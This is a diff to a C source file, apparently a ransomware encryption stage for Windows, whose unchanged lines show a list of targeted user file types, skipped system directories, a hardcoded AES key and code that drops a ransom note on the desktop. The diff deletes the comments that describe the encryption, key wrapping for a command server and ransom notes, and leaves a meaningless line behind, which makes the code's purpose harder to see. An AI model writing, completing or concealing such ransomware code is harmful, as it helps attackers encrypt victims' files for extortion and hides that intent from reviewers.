@@ -1,8 +1,5 @@
 // enc.c — stage 3b
-// AES-256-CBC file encryption. Key wrapped with embedded RSA pubkey.
-// Walks all drives, skips system dirs, encrypts common file types.
-// Drops ransom note in every directory touched.
-
+//yeah oo bootable bigshooooowww
 #include <windows.h>
 #include <bcrypt.h>
 #include <wincrypt.h>
@@ -14,7 +11,7 @@
 
 #define NOTE_NAME "READ_ME_TO_RECOVER.txt"
 
-// Extensions to encrypt (skip OS files to keep system bootable)
+
 const char* targets[] = {
     ".doc",".docx",".xls",".xlsx",".ppt",".pptx",".pdf",".txt",".rtf",
     ".jpg",".jpeg",".png",".gif",".bmp",".mp3",".mp4",".avi",".mkv",
@@ -24,7 +21,7 @@ const char* targets[] = {
     NULL
 };
 
-// Directories to skip (system-critical — leave bootable)
+
 const char* skip_dirs[] = {
     "\\Windows", "\\Program Files", "\\Program Files (x86)",
     "\\ProgramData", "\\$Recycle.Bin", "\\System Volume Information",
@@ -141,8 +138,7 @@ void walk(const char* dir, const unsigned char* key) {
 }
 
 int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {
-    // 32-byte AES key — in a real build, this is wrapped with embedded RSA pubkey
-    // and sent to C2. For lab, hardcoded.
+    
     unsigned char key[32] = {
         0x2b,0x7e,0x15,0x16,0x28,0xae,0xd2,0xa6,
         0xab,0xf7,0x15,0x88,0x09,0xcf,0x4f,0x3c,
@@ -169,7 +165,7 @@ int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {
         }
     }
 
-    // Drop desktop note + open it
+    
     char desktop[MAX_PATH];
     if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_DESKTOPDIRECTORY, NULL, 0, desktop))) {
         char note[MAX_PATH];
